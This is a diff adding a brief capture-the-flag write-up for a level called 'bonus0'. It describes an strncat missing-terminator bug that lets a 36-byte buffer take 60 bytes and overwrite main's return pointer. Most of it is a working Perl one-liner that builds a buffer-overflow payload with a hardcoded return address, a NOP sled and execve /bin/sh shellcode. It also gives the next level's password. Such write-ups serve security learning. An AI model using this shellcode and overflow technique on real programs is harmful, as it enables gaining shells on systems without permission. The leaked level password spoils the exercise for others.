@@ -1,0 +1,7 @@
+If you pass a string > 20 with strncat, your new string had not a '\0' terminated caractere, when you cpy str2 you cpy in reality str2 and str3
+You can have 60 caractere in a string of 36, erase the return ptr of the main, and access to a shell code in the buffer of read.
+
+`perl -e 'open(my $fh, ">", "test"); print $fh "A"x28 . "\x0a\x00" . "A"x4066 . "A"x14 . "\xd0\xe6\xff\xbf" . "\x90" . "\x0a\x00" . "\x90"x161 ."\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" . "\x90"x50'` ; cat test  - | ./bonus0
+
+password bonus1 : cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
+
